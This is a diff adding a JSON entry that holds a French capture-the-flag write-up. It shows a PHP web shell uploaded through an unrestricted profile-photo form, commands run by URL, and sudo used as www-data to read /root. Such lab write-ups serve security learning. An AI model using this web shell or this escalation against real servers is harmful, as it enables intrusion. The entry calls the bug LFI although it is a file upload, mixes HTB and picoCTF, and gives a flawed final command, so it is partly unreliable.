@@ -1,1 +1,11 @@
-[]
+[
+  {
+    "id": "htb-lab-vaccine",
+    "title": "HTB LAB Vaccine",
+    "summary": "exploitation du vulnérabilité File Inclusion (LFI) pour exécuter des commandes shell sur le termial",
+    "topics": [
+      "web-exploitation"
+    ],
+    "content": "contexte: Un développeur a ajouté une fonctionnalité de téléchargement de photo de profil à un site web. Cependant, cette fonctionnalité est défectueuse, ce qui vous offre une opportunité. Votre mission, si vous l'acceptez, consiste à accéder à la page web indiquée et à localiser la zone de téléchargement de fichiers. Votre objectif final est de trouver le drapeau caché dans le ==/root== répertoire.\n\nSur le site  il est demandé d'upload un fichier\n\nCe site étant sans restriction sur les fichiers upload, on envoie un fichier test.php avec cette payload\n```\n<?php system($_GET[\"cmd\"]); ?>\n```\n\nAprès  upload le fichiers est sauvegardé au chemin ``uploads/test.php``\n\non éxécute la requete ``http://standard-pizzas.picoctf.net:61975/uploads/test.php?cmd= ls /\"\n\nqui retourne les répertoire a la racine du serveur, celui ci contient un répertorie **root** comme indique le contexte.\n\non essaye de lister le contenu du repertoire mais sans suite \n\naprès exécution de la commande ``sudo -l`` on remarqeu que l'utilsateur actuel **www-data** peut exécuter l'ensemble des commande **sudo** sur la machine en ==indiquant sont privilège==\n\non liste le contenu avec la rêquete ``http://standard-pizzas.picoctf.net:61975/uploads/test.php?cmd= sudo ls /root\"`` le repertoir contient un fichier **flag.txt**.\n\non execute la rêquete ``http://standard-pizzas.picoctf.net:61975/uploads/test.php?cmd= sudo /root/flag.txt\"\n\nAinsi, on obtient le flag"
+  }
+]
